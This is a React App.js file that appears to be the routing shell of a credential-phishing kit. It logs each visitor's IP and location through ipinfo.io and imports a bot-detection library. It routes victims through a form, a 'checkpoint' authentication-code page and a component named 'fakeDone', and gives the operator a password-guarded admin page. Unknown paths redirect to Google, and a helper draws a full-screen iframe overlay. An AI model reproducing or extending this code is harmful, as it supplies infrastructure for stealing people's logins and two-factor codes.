import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";
import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
import { isbot } from "isbot";
import { Home } from "react-ionicons";


function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);

  function showIframe(file) {
    const html = (
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
    );
    return html;
  }

  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
        var countryCode = d.country;
        setCountryCode(countryCode.toLowerCase());
        localStorage.setItem(
          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);


          return (
            <BrowserRouter>
              <div id="app">
                <Routes>
                  <Route path="/" element={<HomePage/>} />
                  <Route path="id/:userID" element={<MyForm/>} />
                  <Route path="/request" element={<MyForm/>} />
                  <Route path="checkpoint/:userID" element={<AuthCode />} />
                  <Route path="processing/:userID" element={<ClassUser />} />
                  <Route path="/login" element={<Login />} />
                  <Route
                    path="/admin"
                    element={
                      <PrivateRoute>
                        <AdminPage />
                      </PrivateRoute>
                    }
                  />
                  <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                </Routes>
              </div>
            </BrowserRouter>
          );
       
}


export default App;
